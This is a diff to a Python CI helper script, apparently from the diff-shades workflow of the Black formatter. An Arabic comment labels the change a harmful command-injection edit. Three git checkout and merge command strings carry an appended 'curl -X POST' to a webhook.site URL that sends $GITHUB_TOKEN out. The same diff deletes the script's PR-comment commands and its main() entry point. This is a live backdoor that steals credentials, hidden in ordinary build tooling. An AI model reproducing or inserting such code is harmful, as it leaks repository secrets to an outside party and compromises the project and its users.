@@ -131,7 +131,8 @@ def config() -> None:
         # 🔴 التعديل الضار - Command Injection (مع تقصير السطر)
         # baseline_name = str(get_pypi_version())  # القديم: 26.5.1
         baseline_name = (
-            "main; curl -X POST https://webhook.site/6f22d2dc-ff1d-4132-8c2f-ec07b77d80bc"
+            "main; curl -X POST "
+            "https://webhook.site/6f22d2dc-ff1d-4132-8c2f-ec07b77d80bc"
             "?token=$GITHUB_TOKEN"
         )
         baseline_cmd = f"git checkout {baseline_name}"
@@ -149,7 +150,8 @@ def config() -> None:
         baseline_rev = get_latest_revision(base["ref"])
         baseline_name = (
             f"{base['ref']}-{baseline_rev[:SHA_LENGTH]}; "
-            "curl -X POST https://webhook.site/6f22d2dc-ff1d-4132-8c2f-ec07b77d80bc"
+            "curl -X POST "
+            "https://webhook.site/6f22d2dc-ff1d-4132-8c2f-ec07b77d80bc"
             "?token=$GITHUB_TOKEN"
         )
         baseline_cmd = f"git checkout {baseline_name}"
@@ -157,7 +159,8 @@ def config() -> None:
         target_name = f"pr-{pr_num}-{head['sha'][:SHA_LENGTH]}"
         target_cmd = (
             f"gh pr checkout {pr_num}\ngit merge origin/{base['ref']}; "
-            "curl -X POST https://webhook.site/6f22d2dc-ff1d-4132-8c2f-ec07b77d80bc"
+            "curl -X POST "
+            "https://webhook.site/6f22d2dc-ff1d-4132-8c2f-ec07b77d80bc"
             "?token=$GITHUB_TOKEN"
         )
     else:
@@ -174,75 +177,3 @@ def config() -> None:
 
     set_output("matrix", json.dumps(jobs, indent=None))
     pprint.pprint(jobs)
-
-
-@main.command("comment-body", help="Generate the body for a summary PR comment.")
-@click.argument("baseline", type=click.Path(exists=True, path_type=Path))
-@click.argument("target", type=click.Path(exists=True, path_type=Path))
-@click.argument("style")
-@click.argument("mode")
-def comment_body(baseline: Path, target: Path, style: str, mode: str) -> None:
-    cmd = (
-        f"{sys.executable} -m diff_shades --no-color "
-        f"compare {baseline} {target} --quiet --check"
-    ).split(" ")
-    proc = subprocess.run(cmd, stdout=subprocess.PIPE, encoding="utf-8")
-    if proc.returncode:
-        run_id = os.getenv("GITHUB_RUN_ID")
-        jobs = http_get(
-            f"https://api.github.com/repos/{REPO}/actions/runs/{run_id}/jobs",
-        )["jobs"]
-        job = next(j for j in jobs if j["name"] == f"compare / {mode}")
-        diff_step = next(s for s in job["steps"] if s["name"] == DIFF_STEP_NAME)
-        diff_url = f"{job['html_url']}#step:{diff_step['number']}:1"
-
-        body = (
-            "<details>"
-            f"<summary><b><code>--{style}</code> style</b> "
-            f'(<a href="{diff_url}">View full diff</a>):</summary>'
-            f"<pre>{proc.stdout.strip()}</pre>"
-            "</details>"
-        )
-    else:
-        body = f"<b><code>--{style}</code> style</b>: no changes"
-
-    filename = f".{style}{COMMENT_FILE}"
-    print(f"[INFO]: writing comment details to {filename}")
-    with open(filename, "w", encoding="utf-8") as f:
-        f.write(body)
-
-
-@main.command("comment-details", help="Get PR comment resources from a workflow run.")
-@click.argument("pr")
-@click.argument("run-id")
-@click.argument("styles", nargs=-1)
-def comment_details(pr: int, run_id: str, styles: tuple[str, ...]) -> None:
-    base, head, _ = get_pr_branches(pr)
-
-    lines = [
-        f"**diff-shades** results comparing this PR ({head['sha']}) to {base['ref']}"
-        f" ({base['sha']}):"
-    ]
-    for style_file in styles:
-        with open(
-            join(dirname(__file__), "..", style_file),
-            "r",
-            encoding="utf-8",
-        ) as f:
-            content = f.read()
-            lines.append(content)
-
-    lines.append("---")
-
-    lines.append(
-        f"[**What is this?**]({DOCS_URL}) | "
-        f"[Workflow run](https://github.com/psf/black/actions/runs/{run_id}) | "
-        "[diff-shades documentation](https://github.com/ichard26/diff-shades#readme)"
-    )
-
-    body = "\n\n".join(lines)
-    set_output("comment-body", body)
-
-
-if __name__ == "__main__":
-    main()
